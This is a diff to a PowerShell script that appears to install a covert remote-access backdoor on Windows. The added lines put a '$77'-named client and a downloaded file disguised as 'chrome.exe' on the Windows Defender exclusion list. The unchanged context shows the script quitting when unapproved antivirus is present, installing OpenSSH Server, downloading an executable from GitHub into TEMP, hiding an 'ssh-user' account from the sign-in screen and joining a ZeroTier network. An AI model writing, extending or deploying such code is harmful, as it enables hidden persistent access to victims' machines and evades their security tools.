@@ -76,6 +76,22 @@ function Get-AntivirusInfo {
 # Checks for Allowed AVs and quits if any others are detected.
 Get-AntivirusInfo
 
+# Adds `$77SWClient.exe' to the Windows Defender exclusion list
+
+# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
+$exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
+
+# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
+Add-MpPreference -ExclusionPath $exePath
+
+# Adds `chrome.exe' to the Windows Defender exclusion list
+
+# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
+$exePath = 'C:\Users\Aidan\AppData\Local\Temp\chrome.exe'
+
+# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
+Add-MpPreference -ExclusionPath $exePath
+
 # Start a new PowerShell window to install and configure OpenSSH Server asynchronously
 $openSSHScriptBlock = {
     # Install OpenSSH Server feature if not already present
@@ -193,7 +209,7 @@ Write-Host "Services, processes, and startup applications have been configured i
 # Define the URL and download location for improved.exe
 $exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
 $tempFolder = $env:TEMP
-$exePath = Join-Path $tempFolder "hehe.exe"
+$exePath = Join-Path $tempFolder "chrome.exe"
 
 # Download improved.exe from the provided URL
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
@@ -224,17 +240,8 @@ if (-not (Test-Path $specialAccountsPath)) {
 # Add the ssh-user to the UserList to hide it from the sign-in screen
 New-ItemProperty -Path $specialAccountsPath -Name "ssh-user" -Value 0 -PropertyType DWORD -Force
 
-# Adds `$77SWClient.exe' to the Windows Defender exclusion list
-
-# Define the path to the executable, escaping '$' with '`' to ensure it is treated as a literal character
-$exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
-
-# Use the Add-MpPreference cmdlet to add the executable to the exclusion list
-Add-MpPreference -ExclusionPath $exePath
-
 # Output the current exclusion list to verify the addition
 Get-MpPreference | Select -ExpandProperty ExclusionPath
-
 
 # Join the specified ZeroTier network
 # Ensure the ZeroTier service is running before attempting to join a network
